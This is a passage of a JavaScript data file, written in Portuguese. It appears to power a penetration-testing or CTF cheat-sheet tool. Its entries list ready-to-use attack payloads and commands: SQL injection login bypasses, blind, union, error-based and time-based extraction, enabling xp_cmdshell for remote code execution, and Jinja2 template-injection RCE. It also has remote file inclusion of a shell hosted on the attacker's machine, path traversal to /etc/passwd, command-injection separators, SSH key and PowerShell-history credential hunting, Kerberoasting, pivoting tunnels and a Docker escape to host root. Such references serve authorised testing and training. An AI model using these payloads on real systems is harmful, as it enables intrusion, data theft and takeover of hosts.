      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "cron",
      context: "Systemd Scheduled Timers",
      purpose: "Listar timers ativos do systemd que substituem o cron tradicional",
      description: "Mostra servi\u00e7os e timers configurados para execu\u00e7\u00e3o autom\u00e1tica pelo systemd.",
      code: "systemctl list-timers --all 2>/dev/null",
      showUrl: false,
      keywords: "linux systemd timers services privesc"
    },
    {
      id: "linux-path-writable-dirs",
      title: "Linux - Diret\u00f3rios Writable no $PATH",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "path",
      context: "PATH Hijacking",
      purpose: "Verificar se algum diret\u00f3rio do PATH permite escrita",
      description: "Permite criar bin\u00e1rios falsos (ex: curl, tar) em diret\u00f3rios priorit\u00e1rios no PATH que possam ser chamados por scripts root.",
      code: "echo $PATH | tr ':' '\\n' | while read d; do [ -w \"$d\" ] && echo \"Writable: $d\"; done",
      showUrl: false,
      keywords: "linux path hijack writable directories environment"
    },
    {
      id: "linux-writable-files",
      title: "Linux - Arquivos Grav\u00e1veis por Qualquer Usu\u00e1rio",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "writable",
      context: "File Permissions",
      purpose: "Localizar arquivos com permiss\u00e3o de escrita para everyone",
      description: "Verifica se arquivos de configura\u00e7\u00e3o (/etc/passwd, /etc/sudoers, scripts .sh) est\u00e3o com permiss\u00e3o indevida de escrita.",
      code: "find / -writable -type f 2>/dev/null | grep -v '^/proc' | grep -v '^/sys' | head -n 40",
      showUrl: false,
      keywords: "linux writable world files permissions"
    },
    {
      id: "linux-writable-dirs",
      title: "Linux - Diret\u00f3rios Grav\u00e1veis Globais",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "writable",
      context: "File Permissions",
      purpose: "Localizar pastas globais com permiss\u00e3o de escrita para cria\u00e7\u00e3o de artefatos",
      description: "Identifica diret\u00f3rios tempor\u00e1rios ou de aplica\u00e7\u00e3o onde \u00e9 poss\u00edvel dropar scripts e execut\u00e1veis.",
      code: "find / -perm -222 -type d 2>/dev/null | head -n 40",
      showUrl: false,
      keywords: "linux writable directories permissions drop"
    },
    {
      id: "linux-tty-spawn",
      title: "Linux - TTY Spawn via Python",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "tty",
      context: "Shell Stabilization",
      purpose: "Criar pseudo-terminal interativo a partir de um shell burro",
      description: "Inicializa um PTY usando Python para permitir execu\u00e7\u00e3o de comandos interativos como su, passwd e sudo.",
      code: ttyPython(),
      showUrl: false,
      keywords: "linux tty pty python spawn bash"
    },
    {
      id: "linux-tty-stty",
      title: "Linux - TTY Full Upgrade (stty raw)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "tty",
      context: "Shell Stabilization",
      purpose: "Habilitar Ctrl+C, hist\u00f3rico e auto-completar no shell reverso",
      description: "Comando executado no terminal local ap\u00f3s colocar o shell em background com Ctrl+Z para restaurar modo raw.",
      code: ttyStty(),
      showUrl: false,
      keywords: "linux tty stty raw echo fg terminal size"
    },
    {
      id: "linux-ssh-keys",
      title: "Linux - Procura de Chaves Privadas SSH",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "ssh_scp",
      context: "SSH & Credenciais",
      purpose: "Localizar chaves privadas id_rsa, id_ecdsa ou id_ed25519 expostas",
      description: "Procura arquivos de chaves SSH em diret\u00f3rios de usu\u00e1rios, backups e pastas tempor\u00e1rias.",
      code: "find / -name \"id_rsa*\" -o -name \"*.pem\" -o -name \"id_ed25519*\" 2>/dev/null",
      showUrl: false,
      keywords: "linux ssh id_rsa keys private pem credentials"
    },
    {
      id: "linux-scp-transfer",
      title: "Linux - Transfer\u00eancia de Arquivo via SCP",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "ssh_scp",
      context: "SSH / SCP Transfer",
      purpose: "Baixar ou enviar arquivo de forma criptografada via SSH",
      description: "Copia arquivos entre hosts utilizando autentica\u00e7\u00e3o SSH existente.",
      code: "scp user@" + ip + ":/path/file ./",
      showUrl: false,
      keywords: "linux scp ssh file copy download upload"
    },
    {
      id: "linux-proxy-ssh-d",
      title: "Linux - Proxy Din\u00e2mico SOCKS via SSH (-D)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "proxy",
      context: "Pivoting & Proxy",
      purpose: "Abrir porta SOCKS local (1080) atrav\u00e9s de conex\u00e3o SSH",
      description: "Permite tunelar ferramentas como proxychains, browser e nmap atrav\u00e9s do host comprometido.",
      code: "ssh -D 1080 -N -f -q user@" + ip,
      showUrl: false,
      keywords: "linux ssh proxy socks dynamic port forward pivot"
    },
    {
      id: "linux-proxy-local-forward",
      title: "Linux - SSH Local Port Forwarding (-L)",
      category: "linux",
      categoryLabel: "Linux",
      icon: "\udb80\udf27",
      subcat: "proxy",
      context: "Pivoting & Port Forwarding",
      purpose: "Acessar servi\u00e7o interno (ex: 8080 ou 3306) na porta local",
      description: "Encaminha porta remota do host ou de host interno para o localhost do atacante.",
      code: "ssh -L 8080:127.0.0.1:8080 -N -f user@" + ip,
      showUrl: false,
      keywords: "linux ssh local port forwarding tunnel"
    },
    {
      id: "sqli-auth-or",
      title: "SQLi - Auth Bypass (' OR '1'='1)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "auth",
      context: "Authentication Bypass",
      purpose: "Burlar formul\u00e1rios de login cl\u00e1ssicos em consultas SQL n\u00e3o preparadas",
      description: "For\u00e7a a cl\u00e1usula WHERE a retornar verdadeiro para todos os registros.",
      code: "' OR '1'='1' -- -",
      showUrl: true,
      keywords: "sqli auth bypass login or 1=1"
    },
    {
      id: "sqli-auth-admin",
      title: "SQLi - Auth Bypass Admin (admin' --)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "auth",
      context: "Authentication Bypass",
      purpose: "Autenticar diretamente como administrador comentando a valida\u00e7\u00e3o de senha",
      description: "Comenta o restante da query ap\u00f3s especificar o usu\u00e1rio alvo.",
      code: "admin' --",
      showUrl: true,
      keywords: "sqli auth admin comment bypass password"
    },
    {
      id: "sqli-auth-parenthesis",
      title: "SQLi - Auth Bypass com Par\u00eanteses",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "auth",
      context: "Authentication Bypass",
      purpose: "Quebrar consultas SQL encapsuladas em par\u00eanteses",
      description: "Bypassa logins onde a consulta utiliza WHERE (username = '...' AND password = '...').",
      code: "') OR ('1'='1' -- -",
      showUrl: true,
      keywords: "sqli auth bypass parenthesis brackets"
    },
    {
      id: "sqli-bool-true",
      title: "SQLi - Boolean True Condition",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "boolean",
      context: "Boolean Blind SQLi",
      purpose: "Confirmar vulnerabilidade cega baseada em resposta booleana verdadeira",
      description: "Compara a resposta da aplica\u00e7\u00e3o quando a condi\u00e7\u00e3o injetada \u00e9 verdadeira.",
      code: "' AND 1=1 -- -",
      showUrl: true,
      keywords: "sqli boolean blind true condition 1=1"
    },
    {
      id: "sqli-bool-false",
      title: "SQLi - Boolean False Condition",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "boolean",
      context: "Boolean Blind SQLi",
      purpose: "Confirmar altera\u00e7\u00e3o de comportamento em resposta falsa",
      description: "Se a resposta diferir da condi\u00e7\u00e3o verdadeira, confirma a presen\u00e7a de Boolean Blind SQLi.",
      code: "' AND 1=2 -- -",
      showUrl: true,
      keywords: "sqli boolean blind false condition 1=2"
    },
    {
      id: "sqli-bool-extract",
      title: "SQLi - Boolean Substring Extraction",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "boolean",
      context: "Boolean Blind Extraction",
      purpose: "Extrair caracteres individuais de strings do banco caractere por caractere",
      description: "Testa se o primeiro caractere da vers\u00e3o do banco corresponde ao caractere testado.",
      code: "' AND SUBSTRING(version(),1,1)='5' -- -",
      showUrl: true,
      keywords: "sqli boolean substring extract blind"
    },
    {
      id: "sqli-union-order-by",
      title: "SQLi - UNION Column Count (ORDER BY)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "union",
      context: "UNION Based SQLi",
      purpose: "Determinar o n\u00famero exato de colunas retornadas pela query original",
      description: "Incremente o n\u00famero at\u00e9 ocorrer erro para identificar a quantidade de colunas.",
      code: "' ORDER BY 1 -- -",
      showUrl: true,
      keywords: "sqli union order by column count"
    },
    {
      id: "sqli-union-select-null",
      title: "SQLi - UNION SELECT NULL Test",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "union",
      context: "UNION Based SQLi",
      purpose: "Testar compatibilidade de tipos e reflex\u00e3o em tela",
      description: "Preenche as colunas com NULL para verificar onde os dados podem ser refletidos.",
      code: "' UNION SELECT NULL,NULL,NULL -- -",
      showUrl: true,
      keywords: "sqli union select null columns"
    },
    {
      id: "sqli-union-extract-tables",
      title: "SQLi - UNION Extract Tables (Information Schema)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "union",
      context: "UNION Based Schema Dump",
      purpose: "Extrair nomes de tabelas existentes no banco de dados",
      description: "Consulta information_schema.tables para listar tabelas do banco de dados atual.",
      code: "' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database() -- -",
      showUrl: true,
      keywords: "sqli union extract tables information_schema"
    },
    {
      id: "sqli-error-convert",
      title: "SQLi - Error Based (CONVERT MSSQL)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "error",
      context: "Error Based SQLi (MSSQL)",
      purpose: "For\u00e7ar convers\u00e3o de tipo para vazar dados na mensagem de erro do banco",
      description: "Provoca erro de convers\u00e3o revelando o resultado da subquery no log de erro exibido na p\u00e1gina.",
      code: "' AND 1=CONVERT(int, (SELECT @@version)) -- -",
      showUrl: true,
      keywords: "sqli error based convert mssql leak"
    },
    {
      id: "sqli-error-updatexml",
      title: "SQLi - Error Based (updatexml MySQL)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "error",
      context: "Error Based SQLi (MySQL)",
      purpose: "Vazar dados na mensagem de erro de sintaxe XPath",
      description: "Utiliza updatexml ou extractvalue no MySQL para refletir dados na resposta de erro.",
      code: "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) -- -",
      showUrl: true,
      keywords: "sqli error based updatexml mysql xpath leak"
    },
    {
      id: "sqli-time-mysql",
      title: "SQLi - Time Based (MySQL SLEEP)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "time",
      context: "Time Based Blind SQLi (MySQL)",
      purpose: "For\u00e7ar atraso na resposta para confirmar execu\u00e7\u00e3o de c\u00f3digo SQL",
      description: "Se a resposta demorar 5 segundos, confirma a vulnerabilidade sem necessidade de retorno visual de dados.",
      code: "' AND SLEEP(5) -- -",
      showUrl: true,
      keywords: "sqli time based blind sleep 5 mysql"
    },
    {
      id: "sqli-time-mssql",
      title: "SQLi - Time Based (MSSQL WAITFOR DELAY)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "time",
      context: "Time Based Blind SQLi (MSSQL)",
      purpose: "For\u00e7ar atraso em consultas do SQL Server",
      description: "Utiliza a instru\u00e7\u00e3o WAITFOR DELAY para pausar a execu\u00e7\u00e3o da consulta.",
      code: "; WAITFOR DELAY '0:0:5' --",
      showUrl: true,
      keywords: "sqli time based waitfor delay mssql"
    },
    {
      id: "sqli-time-postgres",
      title: "SQLi - Time Based (PostgreSQL pg_sleep)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "time",
      context: "Time Based Blind SQLi (PostgreSQL)",
      purpose: "For\u00e7ar pausa em bancos PostgreSQL",
      description: "Utiliza a fun\u00e7\u00e3o nativa pg_sleep para atrasar a resposta em segundos.",
      code: "' AND (SELECT pg_sleep(5)) --",
      showUrl: true,
      keywords: "sqli time based pg_sleep postgresql"
    },
    {
      id: "sqli-comments-dash",
      title: "SQLi - Coment\u00e1rio Dash Dash (-- -)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "comments",
      context: "SQL Syntax / Truncation",
      purpose: "Comentar o restante da consulta SQL em MySQL, MSSQL e PostgreSQL",
      description: "O espa\u00e7o ap\u00f3s o segundo tra\u00e7o \u00e9 obrigat\u00f3rio no padr\u00e3o ANSI SQL.",
      code: "-- -",
      showUrl: true,
      keywords: "sqli comments dash syntax truncate"
    },
    {
      id: "sqli-comments-hash",
      title: "SQLi - Coment\u00e1rio Hash (#)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "comments",
      context: "SQL Syntax (MySQL)",
      purpose: "Comentar restante da query em MySQL",
      description: "S\u00edmbolo de coment\u00e1rio em linha \u00fanica no MySQL/MariaDB (usar %23 em URLs).",
      code: "#",
      showUrl: true,
      keywords: "sqli comments hash pound mysql"
    },
    {
      id: "sqli-comments-slash-star",
      title: "SQLi - Coment\u00e1rio Multilinha (/* ... */)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "comments",
      context: "SQL Syntax / WAF Bypass",
      purpose: "Coment\u00e1rios em bloco ou inline bypass de espa\u00e7os",
      description: "Pode ser utilizado para bypass de filtros que bloqueiam espa\u00e7os (ex: SELECT/**/user).",
      code: "/* inline comment */",
      showUrl: true,
      keywords: "sqli comments block slash star waf bypass"
    },
    {
      id: "sqli-dbms-mysql",
      title: "SQLi - DBMS MySQL (Vers\u00e3o, Usu\u00e1rio e DB)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "mysql",
      context: "MySQL / MariaDB Identification",
      purpose: "Coletar vers\u00e3o, usu\u00e1rio ativo e nome do banco atual",
      description: "Fun\u00e7\u00f5es fundamentais para reconhecimento de ambiente MySQL.",
      code: "SELECT @@version, user(), database();",
      showUrl: true,
      keywords: "sqli dbms mysql version user database"
    },
    {
      id: "sqli-dbms-mysql-file",
      title: "SQLi - DBMS MySQL (load_file /etc/passwd)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "mysql",
      context: "MySQL File Reading",
      purpose: "Ler arquivos do sistema operacional quando FILE privilege est\u00e1 ativo",
      description: "L\u00ea arquivos locais caso o usu\u00e1rio do banco tenha permiss\u00e3o e secure_file_priv permita.",
      code: "SELECT load_file('/etc/passwd');",
      showUrl: true,
      keywords: "sqli dbms mysql load_file read file"
    },
    {
      id: "sqli-dbms-postgres",
      title: "SQLi - DBMS PostgreSQL (Vers\u00e3o e Usu\u00e1rio)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "postgres",
      context: "PostgreSQL Identification",
      purpose: "Identificar detalhes de vers\u00e3o e privil\u00e9gios no PostgreSQL",
      description: "Fun\u00e7\u00f5es nativas de sistema do PostgreSQL.",
      code: "SELECT version(), current_user, current_database();",
      showUrl: true,
      keywords: "sqli dbms postgresql version current_user"
    },
    {
      id: "sqli-dbms-postgres-read",
      title: "SQLi - DBMS PostgreSQL (pg_read_file)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "postgres",
      context: "PostgreSQL File Reading",
      purpose: "Ler arquivos do servidor via superuser ou pg_read_server_files",
      description: "Fun\u00e7\u00e3o nativa para leitura de arquivos no diret\u00f3rio de dados ou sistema.",
      code: "SELECT pg_read_file('/etc/passwd', 0, 1000);",
      showUrl: true,
      keywords: "sqli dbms postgresql pg_read_file"
    },
    {
      id: "sqli-dbms-mssql",
      title: "SQLi - DBMS MSSQL (Vers\u00e3o e SysAdmin Check)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "mssql",
      context: "MSSQL Identification",
      purpose: "Checar vers\u00e3o e se a sess\u00e3o atual \u00e9 membro da role sysadmin",
      description: "Se IS_SRVROLEMEMBER('sysadmin') retornar 1, \u00e9 poss\u00edvel habilitar xp_cmdshell.",
      code: "SELECT @@version, IS_SRVROLEMEMBER('sysadmin');",
      showUrl: true,
      keywords: "sqli dbms mssql sysadmin xp_cmdshell"
    },
    {
      id: "sqli-dbms-mssql-cmdshell",
      title: "SQLi - DBMS MSSQL (Habilitar xp_cmdshell)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "mssql",
      context: "MSSQL Remote Code Execution",
      purpose: "Ativar e executar comandos do sistema operacional via SQL Server",
      description: "Habilita configura\u00e7\u00f5es avan\u00e7adas e executa comandos cmd.exe com privil\u00e9gio do servi\u00e7o MSSQL.",
      code: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';",
      showUrl: true,
      keywords: "sqli dbms mssql xp_cmdshell rce"
    },
    {
      id: "sqli-dbms-sqlite",
      title: "SQLi - DBMS SQLite (Vers\u00e3o e Schema)",
      category: "sqli",
      categoryLabel: "SQLi",
      icon: "\udb80\uddbc",
      subcat: "sqlite",
      context: "SQLite Database",
      purpose: "Extrair a vers\u00e3o e todas as instru\u00e7\u00f5es CREATE TABLE do SQLite",
      description: "Consulta a tabela de metadados sqlite_master para mapear colunas e tabelas.",
      code: "SELECT sqlite_version(), sql FROM sqlite_master WHERE type='table';",
      showUrl: true,
      keywords: "sqli dbms sqlite sqlite_version sqlite_master"
    },
    {
      id: "web-hdr-audit",
      title: "Web - HTTP Security Headers Audit",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "headers",
      context: "HTTP Headers Security",
      purpose: "Inspecionar cabe\u00e7alhos de seguran\u00e7a (CSP, HSTS, X-Frame-Options, CORS)",
      description: "Requisita apenas os headers de resposta HTTP para verificar prote\u00e7\u00f5es contra clickjacking, MIME sniffing e XSS.",
      code: "curl -I -s -k http://" + ip + ":" + port + "/",
      showUrl: false,
      keywords: "web headers http curl security csp hsts x-frame"
    },
    {
      id: "web-hdr-xff",
      title: "Web - X-Forwarded-For IP Spoofing",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "headers",
      context: "HTTP Headers Testing",
      purpose: "Bypass de restri\u00e7\u00e3o de IP de rede interna ou painel admin",
      description: "Simula requisi\u00e7\u00e3o originada do localhost (127.0.0.1) atrav\u00e9s de cabe\u00e7alhos de proxy reverso.",
      code: "curl -H \"X-Forwarded-For: 127.0.0.1\" -H \"X-Real-IP: 127.0.0.1\" -H \"X-Custom-IP-Authorization: 127.0.0.1\" http://" + ip + ":" + port + "/admin",
      showUrl: false,
      keywords: "web headers x-forwarded-for x-real-ip spoofing bypass"
    },
    {
      id: "web-hdr-host",
      title: "Web - Host Header Injection",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "headers",
      context: "HTTP Headers Testing",
      purpose: "Testar vulnerabilidade de envenenamento de cache ou reset de senha",
      description: "Envia um cabe\u00e7alho Host arbitr\u00e1rio para verificar se a aplica\u00e7\u00e3o reflete em links gerados.",
      code: "curl -H \"Host: evil.com\" http://" + ip + ":" + port + "/password_reset",
      showUrl: false,
      keywords: "web headers host header injection cache poison"
    },
    {
      id: "web-ssti-jinja2-test",
      title: "Web - SSTI Jinja2 Test ({{7*7}})",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "ssti",
      context: "Server-Side Template Injection (Python)",
      purpose: "Confirmar avalia\u00e7\u00e3o de express\u00f5es em templates Jinja2 / Flask",
      description: "Se a resposta renderizar 49 em vez do texto bruto {{7*7}}, o template engine est\u00e1 executando c\u00f3digo.",
      code: "{{7*7}}",
      showUrl: true,
      keywords: "web ssti jinja2 flask python 7*7"
    },
    {
      id: "web-ssti-jinja2-rce",
      title: "Web - SSTI Jinja2 Remote Code Execution",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "ssti",
      context: "Server-Side Template Injection (Python)",
      purpose: "Executar comandos do sistema operacional atrav\u00e9s de subclasses do Python",
      description: "Navega pelas subclasses do Python para instanciar subprocess.Popen ou os.popen.",
      code: "{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}}",
      showUrl: true,
      keywords: "web ssti jinja2 rce python popen"
    },
    {
      id: "web-ssti-twig",
      title: "Web - SSTI Twig Test (PHP)",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "ssti",
      context: "Server-Side Template Injection (PHP)",
      purpose: "Testar template engine Twig em aplica\u00e7\u00f5es PHP / Symfony",
      description: "Verifica execu\u00e7\u00e3o de express\u00f5es em templates Twig.",
      code: "{{7*'7'}}",
      showUrl: true,
      keywords: "web ssti twig php symfony"
    },
    {
      id: "web-rfi-http",
      title: "Web - RFI HTTP Include",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "rfi",
      context: "Remote File Inclusion",
      purpose: "Incluir script PHP hospedado no servidor do atacante",
      description: "Requer que allow_url_include esteja habilitado no php.ini.",
      code: "http://" + ip + ":" + port + "/index.php?page=http://" + ip + ":8000/shell.txt?",
      showUrl: true,
      keywords: "web rfi remote file inclusion http php"
    },
    {
      id: "web-rfi-smb",
      title: "Web - RFI via SMB Share (Windows)",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "rfi",
      context: "Remote File Inclusion (SMB)",
      purpose: "Burlar restri\u00e7\u00e3o de allow_url_include no Windows usando caminho UNC",
      description: "O PHP no Windows trata compartilhamentos SMB (\\\\ip\\share) como arquivos locais.",
      code: "\\\\" + ip + "\\share\\shell.php",
      showUrl: true,
      keywords: "web rfi smb unc windows bypass"
    },
    {
      id: "web-traversal-classic",
      title: "Web - Path Traversal (/etc/passwd)",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "traversal",
      context: "Path Traversal",
      purpose: "Retroceder diret\u00f3rios para ler o arquivo de contas do Linux",
      description: "Sequ\u00eancia cl\u00e1ssica de diret\u00f3rios pai para alcan\u00e7ar o diret\u00f3rio raiz.",
      code: "../../../../../../../../etc/passwd",
      showUrl: true,
      keywords: "web traversal path etc passwd dot dot slash"
    },
    {
      id: "web-traversal-double-encode",
      title: "Web - Path Traversal (Double URL Encode)",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "traversal",
      context: "Path Traversal / WAF Bypass",
      purpose: "Burlar filtros que realizam apenas uma rodada de URL decode",
      description: "Codifica %2e%2e%2f duas vezes (%252e%252e%252f).",
      code: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
      showUrl: true,
      keywords: "web traversal double url encode bypass waf"
    },
    {
      id: "web-cmdi-pipe",
      title: "Web - Command Injection (Pipe |)",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "cmdi",
      context: "OS Command Injection",
      purpose: "Redirecionar sa\u00edda e encadear comando arbitr\u00e1rio",
      description: "Utiliza pipe para passar resultado ao pr\u00f3ximo comando executado pelo shell.",
      code: "127.0.0.1 | whoami",
      showUrl: true,
      keywords: "web cmdi command injection pipe whoami"
    },
    {
      id: "web-cmdi-semicolon",
      title: "Web - Command Injection (Semicolon ;)",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "cmdi",
      context: "OS Command Injection",
      purpose: "Separador de instru\u00e7\u00f5es em ambientes Linux/Unix",
      description: "Finaliza o comando original e executa o comando injetado subsequentemente.",
      code: "127.0.0.1; id",
      showUrl: true,
      keywords: "web cmdi command injection semicolon id"
    },
    {
      id: "web-cmdi-subshell",
      title: "Web - Command Injection (Subshell $(...))",
      category: "web",
      categoryLabel: "Web",
      icon: "\udb81\udd9f",
      subcat: "cmdi",
      context: "OS Command Injection",
      purpose: "Interpolar comandos dentro de argumentos de programas",
      description: "O interpretador Bash avalia o conte\u00fado interno do subshell antes de executar o comando principal.",
      code: "$(id)",
      showUrl: true,
      keywords: "web cmdi subshell command injection interpolation"
    },
    {
      id: "cheat-linux-enum",
      title: "Linux - Enumera\u00e7\u00e3o B\u00e1sica de Sistema",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "linux",
      context: "Linux CTF Cheatsheet",
      purpose: "Identificar OS, arquitetura, usu\u00e1rio atual e privil\u00e9gios sudo",
      description: "Primeiros comandos executados ao obter acesso a um host Linux.",
      code: "whoami; id; uname -a; cat /etc/os-release; sudo -l 2>/dev/null",
      showUrl: false,
      keywords: "cheat linux enum whoami id uname sudo"
    },
    {
      id: "cheat-linux-net",
      title: "Linux - Portas em Escuta e Conex\u00f5es (ss / netstat)",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "linux",
      context: "Linux Networking",
      purpose: "Descobrir servi\u00e7os locais escutando apenas em 127.0.0.1",
      description: "Identifica bancos de dados, portas de debug e webapps internas n\u00e3o expostas externamente.",
      code: "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null",
      showUrl: false,
      keywords: "cheat linux netstat ss ports listening sockets"
    },
    {
      id: "cheat-win-whoami",
      title: "Windows - Privil\u00e9gios e Grupos Atuais",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "windows",
      context: "Windows CTF Cheatsheet",
      purpose: "Verificar se tokens SeImpersonatePrivilege ou SeDebugPrivilege est\u00e3o ativos",
      description: "Comando essencial para decidir vetor de privilege escalation (ex: JuicyPotato / GodPotato).",
      code: "whoami /priv; whoami /groups",
      showUrl: false,
      keywords: "cheat windows whoami priv groups seimpersonate"
    },
    {
      id: "cheat-win-powershell-history",
      title: "Windows - Hist\u00f3rico do PowerShell",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "windows",
      context: "Windows Post-Exploitation",
      purpose: "Extrair senhas e comandos digitados anteriormente pelo administrador",
      description: "L\u00ea o arquivo ConsoleHost_history.txt onde o hist\u00f3rico do PSReadline fica gravado.",
      code: "type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
      showUrl: false,
      keywords: "cheat windows powershell history credentials psreadline"
    },
    {
      id: "cheat-ad-domain-admins",
      title: "Active Directory - Listar Membros de Domain Admins",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "ad",
      context: "Active Directory Cheatsheet",
      purpose: "Identificar contas privilegiadas de administra\u00e7\u00e3o do dom\u00ednio",
      description: "Utiliza o comando nativo net.exe para consultar o cat\u00e1logo do dom\u00ednio.",
      code: "net group \"Domain Admins\" /domain",
      showUrl: false,
      keywords: "cheat ad active directory domain admins net group"
    },
    {
      id: "cheat-ad-spn",
      title: "Active Directory - Kerberoasting SPN Search",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "ad",
      context: "Active Directory Cheatsheet",
      purpose: "Listar Service Principal Names (SPNs) vulner\u00e1veis a Kerberoast",
      description: "Identifica contas de servi\u00e7o que utilizam senhas fracas cracke\u00e1veis offline.",
      code: "setspn -T " + domain + " -Q \"*/*\"",
      showUrl: false,
      keywords: "cheat ad kerberoasting setspn spn service principal"
    },
    {
      id: "cheat-web-ffuf",
      title: "Web - Fuzzing de Diret\u00f3rios com ffuf",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "web",
      context: "Web Discovery Cheatsheet",
      purpose: "Fuzzing de alta velocidade para descoberta de arquivos e rotas ocultas",
      description: "Substitui a palavra FUZZ pela wordlist recursivamente filtrando c\u00f3digos de erro.",
      code: "ffuf -u http://" + ip + ":" + port + "/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403",
      showUrl: false,
      keywords: "cheat web ffuf fuzzing directories discovery seclists"
    },
    {
      id: "cheat-web-sqlmap",
      title: "Web - Automa\u00e7\u00e3o SQLi com sqlmap",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "web",
      context: "Web Vulnerability Testing",
      purpose: "Automatizar teste de inje\u00e7\u00e3o SQL e extra\u00e7\u00e3o de bancos de dados",
      description: "Testa par\u00e2metros do alvo e extrai a lista de schemas dispon\u00edveis.",
      code: "sqlmap -u \\\"http://" + ip + ":" + port + "/item?id=1\\\" --batch --dbs",
      showUrl: false,
      keywords: "cheat web sqlmap sqli automate dbs"
    },
    {
      id: "cheat-docker-escape",
      title: "Docker - Container Escape via Host Root Mount",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "docker",
      context: "Docker Container Breakout",
      purpose: "Obter acesso root ao host montando a raiz / dentro do container",
      description: "Se o usu\u00e1rio atual pertencer ao grupo docker, executa um container montando o sistema de arquivos do host.",
      code: "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash",
      showUrl: false,
      keywords: "cheat docker container escape mount root host group"
    },
    {
      id: "cheat-docker-socket",
      title: "Docker - Checar Permiss\u00e3o no Socket Docker",
      category: "cheats",
      categoryLabel: "Cheatsheets",
      icon: "\udb81\udea9",
      subcat: "docker",
      context: "Docker Socket Security",
